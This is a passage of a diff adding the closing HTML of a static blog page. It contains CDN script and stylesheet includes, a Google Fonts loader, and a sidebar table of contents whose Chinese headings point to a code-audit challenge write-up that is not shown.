+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#审计题目">审计题目</a></li>
+    <li><a href="#预期解">预期解</a></li>
+    <li><a href="#题目非预期">题目非预期</a></li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
